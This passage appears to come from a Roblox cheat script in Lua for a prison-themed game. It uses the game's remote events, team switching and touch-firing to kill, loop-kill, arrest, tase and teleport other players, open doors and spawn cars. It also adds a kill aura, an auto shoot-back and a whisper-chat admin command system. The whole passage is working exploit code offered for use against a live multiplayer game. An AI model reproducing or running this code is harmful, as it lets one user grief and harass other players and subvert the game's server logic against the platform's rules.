						local WhoShot = nil
						for i,v in pairs(game:GetService("Players"):GetPlayers()) do
							if v.Character:IsAncestorOf(Hit) then
								WhoShot = v
								PlayerHit = Hit
								break
							end
						end
						local Worked,ufhwiufwe2 = pcall(function()
							WhoShot = MostClose((Cframe * CFrame.new(0, 0, -Distance / 2)).p)
						end)
						if Worked and WhoShot and PlayerHit and not Unloaded then
							if States.ShootBack and not ShootbackCooldown then
								if PlayerHit then
									if PlayerHit and Player.Character:IsAncestorOf(PlayerHit) and ShootbackCooldown == false and WhoShot.Team ~= plr.Team then
										ShootbackCooldown = true
										API:KillPlayer(WhoShot)
										wait(1)
										ShootbackCooldown = false
									end
								end
							end
						end
					end
				end
				Count = Count + 1
			end
		end
	end)
end
coroutine.wrap(function()
	game:GetService("ReplicatedStorage"):WaitForChild("ReplicateEvent").OnClientEvent:Connect(ReplicationEventFunction)
end)()
--ClientGunReplicator
if PremiumActivated then
	local BulletCoolDown = false
	Temp.GunHandler =game:GetService("ReplicatedStorage"):WaitForChild("ReplicateEvent").OnClientEvent:connect(function(Amount, Value)
		if not States.anticrash then
			return
		end
		if #Amount <70 and not BulletCoolDown then
			BulletCoolDown =true
			for i = 1, #Amount do
				local Bullet = Instance.new("Part", workspace.CurrentCamera)
				Bullet.Name = "RayPart"
				Bullet.Material = Enum.Material.Neon
				Bullet.Anchored = true
				Bullet.CanCollide = false
				Bullet.Transparency = 0.5
				Bullet.formFactor = Enum.FormFactor.Custom
				Bullet.Size = Vector3.new(0.2, 0.2, Amount[i].Distance)
				Bullet.CFrame = Amount[i].Cframe
				game.Debris:AddItem(Bullet, 0.05)
				Instance.new("BlockMesh", Bullet).Scale = Vector3.new(0.5, 0.5, 1)
				if Value then
					Bullet.BrickColor = BrickColor.new("Cyan")
					local Light = Instance.new("SurfaceLight", Bullet)
					Light.Color = Color3.new(0, 0.9176470588235294, 1)
					Light.Range = 5
					Light.Face = "Bottom"
					Light.Brightness = 10
					Light.Angle = 180
					task.spawn(function()
						for v7 = 1, 10 do
							Bullet.Transparency = Bullet.Transparency + 0.1
							Light.Brightness = Light.Brightness - 1
							wait()
						end
					end)
				else
					Bullet.BrickColor = BrickColor.Yellow()
				end
			end
			wait(.01)
			BulletCoolDown = false
		end
	end)
	local CoolDown = false
	Temp.SoundHandler = game:GetService("ReplicatedStorage"):WaitForChild("SoundEvent").OnClientEvent:connect(function(Sound1, p4)
		if not States.anticrash then
			return
		end
		if CoolDown then
			CoolDown = true
			local Sound = Sound1:Clone()
			Sound.Parent = Sound1.Parent
			Sound:Play()
			Sound.Played:Connect(function()
				wait()
				game:GetService("Debris"):AddItem(Sound,0.001)
			end)
			wait(.1)
			CoolDown = false
		end
	end)
	Temp.WarnHandler = game:GetService("ReplicatedStorage"):WaitForChild("WarnEvent").OnClientEvent:connect(function(Text)
		if not States.anticrash then
			return
		end
		local WarnGui = game:GetService("ReplicatedStorage").gooeys.WarnGui:Clone()
		WarnGui.Parent = plr.PlayerGui
		if Text == 1 then
			WarnGui.Frame.desc.Text = "This is your last warning. You will become a prisoner if you kill an innocent player 1 more time."
		else
			WarnGui.Frame.desc.Text = "Do not kill innocent people! You will be arrested and jailed if you kill " .. Text .. " more times."
		end
		WarnGui.Frame.LocalScript.Disabled = false
	end)
end
function Msg(player,Text)
	local ohString1 = "/w "..player.Name.." "..Text
	local ohString2 = "All"
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
end

local Arg1_P=""
local function PlayerCheckCommand(G)
	if Arg1_P == Prefix..G then
		return true
	else
		return false
	end
end
function AdminChatted(Text,Speaker)
	local Commands = {--//Actual commands
		Prefix.."car",
		Prefix.."arrest [PLAYER,ALL]",
		Prefix.."kill [PLAYER,ALL,TEAM]",
		Prefix.."opendoors",
		Prefix.."loopkill [PLAYER,ALL]",
		Prefix.."unloopkill [PLAYER,ALL]",
		Prefix.."bring [PLAYER]",
		Prefix.."goto [PLAYER]",
	}
	local Commands2 = { --//Teleports
		Prefix.."nex [ME,PLAYER]",
		Prefix.."prison [ME,PLAYER]",
		Prefix.."cbase [ME,PLAYER]",
		Prefix.."yard [ME,PLAYER]",
		Prefix.."tower [ME,PLAYER]",
		Prefix.."armory [ME,PLAYER]"
	}
	Speaker = game:GetService("Players"):FindFirstChild(Speaker)
	if Unloaded then return end
	local TXT = string.lower(Text)
	local SPLITED = TXT:split(" ")
	Arg1_P = SPLITED[1]
	local Arg2_P = SPLITED[2]
	local Arg3_P = SPLITED[3]
	local Arg4_P = SPLITED[4]
	if PlayerCheckCommand("cmds") then
		do
			local Converted = Commands
			for i,v in pairs(Converted) do
				if v then
					Converted[i]=Converted[i]..", "
				end
			end
			local Output = table.concat(Converted)
			Msg(Speaker,Output)
		end
		do
			local Converted = Commands2
			for i,v in pairs(Converted) do
				if v then
					Converted[i]=Converted[i]..", "
				end
			end
			local Output = table.concat(Converted)
			Msg(Speaker,Output)
		end
	end
	if PlayerCheckCommand("loopkill") then
		if Arg2_P == "all" then
			Temp.Loopkillall = false
			API:Notif("Unloopkilling all")
		else
			local Player = API:FindPlayer(Arg2_P)
			if table.find(Temp.Loopkilling,Player.Name) then
				table.remove(Temp.Loopkilling,table.find(Temp.Loopkilling,Player.Name))
				API:Notif("Player has been unlooped")
			else
				API:Notif("Player is already getting loop killed!",false)
			end
		end
	end

	if PlayerCheckCommand("loopkill") then
		if Arg2_P == "all" then
			Temp.Loopkillall = true
		else
			local Player = API:FindPlayer(Arg2_P)
			if not table.find(Temp.Loopkilling,Player.Name) then
				table.insert(Temp.Loopkilling, Player.Name)
			end
		end
	end

	if PlayerCheckCommand("arrest") then
		if Arg2_P =="all" then
			local Lastp = API:GetPosition()
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v ~= Player and v.Team ~= game.Teams.Guards and v.Team ~= game.Teams.Neutral and v ~= plr and API:BadArea(v) or v.Team == game.Teams.Criminals and v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").Health>0 then
					local d = false
					task.spawn(function()
						repeat
							if v.Team == game.Teams.Inmates then
								break
							end
							task.wait()
							pcall(function()
								API:MoveTo(v.Character:GetPrimaryPartCFrame())
							end)
							if v.Character:FindFirstChildOfClass("Humanoid").Health<1 then
								break
							end
							API:UnSit()
						until d
					end)
					repeat
						wait(.2)
						local a = pcall(function()
							local ohInstance1 = v.Character["HumanoidRootPart"]
							workspace.Remote.arrest:InvokeServer(ohInstance1)
						end)
						if v.Character:FindFirstChildOfClass("Humanoid").Health<1 then
							break
						end
						API:UnSit()
					until v.Character["Head"]:FindFirstChildOfClass("BillboardGui")
					d = true
					API:MoveTo(Lastp)
					wait(.7)
				end
			end
			API:MoveTo(Lastp)
		else
			local Player = API:FindPlayer(Arg2_P)
			local v = Player
			local Lastp = API:GetPosition()
			if v.Team ~= game.Teams.Guards and v.Team ~= game.Teams.Neutral and v ~= plr and API:BadArea(v) or v.Team == game.Teams.Criminals and v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").Health>0 then
				if v == Player then
					local d = false
					task.spawn(function()
						repeat
							task.wait()
							pcall(function()
								API:MoveTo(Player.Character:GetPrimaryPartCFrame())
							end)
							if v.Character:FindFirstChildOfClass("Humanoid").Health<1 then
								break
							end
						until d
					end)
					repeat
						wait(.2)
						local a = pcall(function()
							local ohInstance1 = v.Character["HumanoidRootPart"]
							workspace.Remote.arrest:InvokeServer(ohInstance1)
						end)
						if v.Character:FindFirstChildOfClass("Humanoid").Health<1 then
							break
						end
						API:UnSit()
					until v.Character["Head"]:FindFirstChildOfClass("BillboardGui")
					d = true
				end
			else
				API:Notif("This Player cannot be arrested",false)
			end
			API:MoveTo(Lastp)
		end
	end
	if PlayerCheckCommand("aura") then

		if Arg2_P then
			local Player = API:FindPlayer(Arg2_P)
			if not table.find(Temp.KillAuras,Player) then
				table.insert(Temps.KillAuras, Player)
			end
		elseif not Arg2_P then
			if not table.find(Temp.KillAuras,Speaker) then
				table.insert(Temps.KillAuras, Speaker)
			end
		end
	end
	if PlayerCheckCommand("unaura") then

		if Arg2_P then
			local Player = API:FindPlayer(Arg2_P)
			if table.find(Temp.KillAuras,Player) then
				table.remove(Temp.KillAuras,table.find(Temp.KillAuras,Player))
			end
		else
			if table.find(Temp.KillAuras,Speaker) then
				table.remove(Temp.KillAuras,table.find(Temp.KillAuras,Speaker))
			end
		end
	end
	if PlayerCheckCommand("tase") then
		local Player = API:FindPlayer(Arg2_P)
		if Player then
			local Oldt = Player.Team
			API:ChangeTeam(game.Teams.Guards)
			wait()
			task.spawn(function()
				game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
			end)
			local ohTable1 = {
				[1] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
					["Distance"] = -1,
					["Cframe"] = CFrame.new(),
					["Hit"] = Player.Character.Head
				}
			}
			local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack.Taser

			game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
			task.spawn(function()
				game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
			end)
			wait(.1)
			API:ChangeTeam(Oldt)
		end
	end
	if PlayerCheckCommand("goto") then
		local Target = API:FindPlayer(Arg2_P)
		if Target then
			API:bring(Speaker,Target.Character:GetPrimaryPartCFrame())
		end
	end
	if PlayerCheckCommand("bring") then
		local Target = API:FindPlayer(Arg2_P)
		if Target then
			API:bring(Target,Speaker.Character.Head.CFrame)
		end
	end
	if PlayerCheckCommand("opengate") then
		local OldPos = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
		API:MoveTo(CFrame.new(503.998993, 102.039917, 2242.79907, 0.99996537, -1.0554821e-08, -0.00832392555, 1.00791926e-08, 1, -5.71817864e-08, 0.00832392555, 5.70959067e-08, 0.99996537))
		wait(.1)
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"])
		API:MoveTo(OldPos)
	end
	if PlayerCheckCommand("opendoors") then
		if not firetouchinterest then
			return API:Notif("Your exploit doesnt support this command!",false)
		end
		local LastTeam =plr.Team
		API:ChangeTeam(game.Teams.Guards)
		wait(.7)
		task.spawn(function()
			local Arg_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Prison Gate"]["Prison Gate"]
			local Event = game:GetService("Workspace").Remote.ItemHandler
			Event:InvokeServer(Arg_1)
		end)
		for i,v in pairs(game:GetService("Workspace").Doors:GetChildren()) do
			if v then
				if v:FindFirstChild("block") and v:FindFirstChild("block"):FindFirstChild("hitbox") then
					firetouchinterest(Player.Character.HumanoidRootPart,v.block.hitbox,0)
					firetouchinterest(Player.Character.HumanoidRootPart,v.block.hitbox,1)
				end
			end
		end
		wait(1)
		API:ChangeTeam(LastTeam)
	end
	if PlayerCheckCommand("kill") then
		if Arg2_P == "all" then
			API:killall()
		elseif Arg2_P == "everyone" then
			API:killall()
		elseif Arg2_P == "others" then
			API:killall()
		elseif Arg2_P == "guards" then
			API:killall(game.Teams.Guards)
		elseif Arg2_P == "inmates" then
			API:killall(game.Teams.Inmates)
		elseif Arg2_P == "criminals" then
			API:killall(game.Teams.Criminals)
		else
			local Player = API:FindPlayer(Arg2_P)
			if Player then
				API:KillPlayer(Player)
			end
		end
	end
	if PlayerCheckCommand("nex") then
		if Arg2_P == "me" then
			API:bring(Speaker, CFrame.new(916.738098, 99.989975, 2375.38403, 0.99996829, 0, 0.00796249602, 0, 1, 0, -0.00796249602, 0, 0.99996829))
		elseif Arg2_P then
			local Target = API:FindPlayer(Arg2_P)
			if Target then
				API:bring(Target, CFrame.new(916.738098, 99.989975, 2375.38403, 0.99996829, 0, 0.00796249602, 0, 1, 0, -0.00796249602, 0, 0.99996829))
			end
		else
			API:bring(Speaker, CFrame.new(916.738098, 99.989975, 2375.38403, 0.99996829, 0, 0.00796249602, 0, 1, 0, -0.00796249602, 0, 0.99996829))
		end
	end
	if PlayerCheckCommand("prison") then
		if Arg2_P == "me" then
			API:bring(Speaker, CFrame.new(916.738098, 99.989975, 2375.38403, 0.99996829, 0, 0.00796249602, 0, 1, 0, -0.00796249602, 0, 0.99996829))
		elseif Arg2_P then
			local Target = API:FindPlayer(Arg2_P)
			if Target then
				API:bring(Target, CFrame.new(916.738098, 99.989975, 2375.38403, 0.99996829, 0, 0.00796249602, 0, 1, 0, -0.00796249602, 0, 0.99996829))
			end
		else
			API:bring(Speaker, CFrame.new(916.738098, 99.989975, 2375.38403, 0.99996829, 0, 0.00796249602, 0, 1, 0, -0.00796249602, 0, 0.99996829))
		end
	end
	if PlayerCheckCommand("yard") then
		if Arg2_P == "me" then
			API:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		elseif Arg2_P then
			local Target = API:FindPlayer(Arg2_P)
			if Target then
				API:bring(Target, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
			end
		else
			API:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		end
	end
	if PlayerCheckCommand("tower") then
		if Arg2_P == "me" then
			API:bring(Speaker, CFrame.new(822.355164, 142.638184, 2587.71753, 0.999500692, 1.78500699e-08, -0.0315965861, -1.87901747e-08, 1, -2.94564462e-08, 0.0315965861, 3.00354444e-08, 0.999500692))
		elseif Arg2_P then
			local Target = API:FindPlayer(Arg2_P)
			if Target then
				API:bring(Target, CFrame.new(822.355164, 142.638184, 2587.71753, 0.999500692, 1.78500699e-08, -0.0315965861, -1.87901747e-08, 1, -2.94564462e-08, 0.0315965861, 3.00354444e-08, 0.999500692))
			end
		else
			API:bring(Speaker, CFrame.new(822.355164, 142.638184, 2587.71753, 0.999500692, 1.78500699e-08, -0.0315965861, -1.87901747e-08, 1, -2.94564462e-08, 0.0315965861, 3.00354444e-08, 0.999500692))
		end
	end
	if PlayerCheckCommand("cbase") then
		if Arg2_P == "me" then
			API:bring(Speaker, CFrame.new(-843.855469, 93.7955246, 2058.3606, 0.00948868692, -4.14198537e-10, 0.999954998, 6.77936429e-10, 1, 4.07784168e-10, -0.999954998, 6.74036604e-10, 0.00948868692))
		elseif Arg2_P then
			local Target = API:FindPlayer(Arg2_P)
			if Target then
				API:bring(Target, CFrame.new(-843.855469, 93.7955246, 2058.3606, 0.00948868692, -4.14198537e-10, 0.999954998, 6.77936429e-10, 1, 4.07784168e-10, -0.999954998, 6.74036604e-10, 0.00948868692))
			end
		else
			API:bring(Speaker, CFrame.new(-843.855469, 93.7955246, 2058.3606, 0.00948868692, -4.14198537e-10, 0.999954998, 6.77936429e-10, 1, 4.07784168e-10, -0.999954998, 6.74036604e-10, 0.00948868692))
		end
	end
	if PlayerCheckCommand("armory") then
		if Arg2_P == "me" then
			API:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		elseif Arg2_P then
			local Target = API:FindPlayer(Arg2_P)
			if Target then
				API:bring(Target, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
			end
		else
			API:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		end
	end
	if PlayerCheckCommand("saferoom") then
		if Arg2_P == "me" then
			API:bring(Speaker, CFrame.new(704.895935, 99.9899826, 2373.47876, 0.0323696211, -1.06273255e-07, -0.999475956, -4.96659567e-08, 1, -1.07937481e-07, 0.999475956, 5.3133828e-08, 0.0323696211))
		elseif Arg2_P then
			local Target = API:FindPlayer(Arg2_P)
			if Target then
				API:bring(Target, CFrame.new(704.895935, 99.9899826, 2373.47876, 0.0323696211, -1.06273255e-07, -0.999475956, -4.96659567e-08, 1, -1.07937481e-07, 0.999475956, 5.3133828e-08, 0.0323696211))
			end
		else
			API:bring(Speaker, CFrame.new(704.895935, 99.9899826, 2373.47876, 0.0323696211, -1.06273255e-07, -0.999475956, -4.96659567e-08, 1, -1.07937481e-07, 0.999475956, 5.3133828e-08, 0.0323696211))
		end
	end
	if PlayerCheckCommand("car") then
		pcall(function()
			local Older = API:GetPosition()
			local OldPos = Speaker.Character:GetPrimaryPartCFrame()
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-910, 95, 2157))
			wait()
			local car = nil
			task.spawn(function()
				car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
			end)
			repeat wait(.1)
				local ohInstance1 = game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[8]["Car Spawner"]
				workspace.Remote.ItemHandler:InvokeServer(ohInstance1)
			until car
			repeat task.wait() until car:FindFirstChild("RWD") and car:FindFirstChild("Body") and car:FindFirstChild("Body"):FindFirstChild("VehicleSeat")
			car.PrimaryPart = car.RWD
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(OldPos)
			wait(1)
			local Done = false
			car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
			repeat 
				game:GetService("RunService").RenderStepped:Wait()
				car:SetPrimaryPartCFrame(OldPos)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =CFrame.new(car.Body.VehicleSeat.Position)
				car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
				if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit == true then
					Done = true
				end
			until Done
			wait(.3)
			API:UnSit()
			API:MoveTo(Older)
		end)
	end
end
game:GetService("RunService").RenderStepped:Connect(function()--//Global Runservice
	if not Unloaded and States.killaura and Temp.KillPart and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").Health >1 then
		Temp.KillPart.CFrame = CFrame.new(API:GetPosition().Position)
	else
		if Temp.KillPart and States.killaura then
			Temp.KillPart.CFrame = CFrame.new(1,838539835428,0)
		elseif not Temp.KillPart and States.killaura then
			API:CreateKillPart()
		end
	end
end)

local function PlayerAddedANTIFLING(Player)
	if Unloaded or not States.AntiFling then
		return
	end
	local Detected = false
	local Character;
	local PrimaryPart;

	local function CharacterAdded(NewCharacter)
		Character = NewCharacter
		repeat
			wait()
			PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
		until PrimaryPart
		Detected = false
	end

	CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
	Player.CharacterAdded:Connect(CharacterAdded)
	game:GetService("RunService").Heartbeat:Connect(function()
		if not Unloaded and  States.AntiFling then
			if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
				if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
					Detected = true
					for i,v in ipairs(Character:GetDescendants()) do
						if v:IsA("BasePart") then
							v.CanCollide = false
							v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
							v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
							v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
						end
					end
					PrimaryPart.CanCollide = false
					PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
					PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
					PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
				end
			end
		end
	end)
end
for i,v in ipairs(game:GetService("Players"):GetPlayers()) do
	if v ~= plr then
		PlayerAddedANTIFLING(v)
	end
end
game:GetService("Players").PlayerAdded:Connect(PlayerAddedANTIFLING)

local LastPosition = nil
game:GetService("RunService").Heartbeat:Connect(function()
	if not Unloaded and States.AntiFling then
		pcall(function()
			local PrimaryPart = plr.Character.PrimaryPart
			if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
				PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
				PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
				PrimaryPart.CFrame = LastPosition
			elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
				LastPosition = PrimaryPart.CFrame
			end
		end)
	end
end)
local DefaultChatSystemChatEvents = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents
API:Notif("!noinvite to disable discord inviter",nil,true)
CmdBarFrame:TweenPosition(UDim2.new(0.5, 0, 0.899999998, 0)-UDim2.new(0,0,.05,0),"Out","Back",.5)
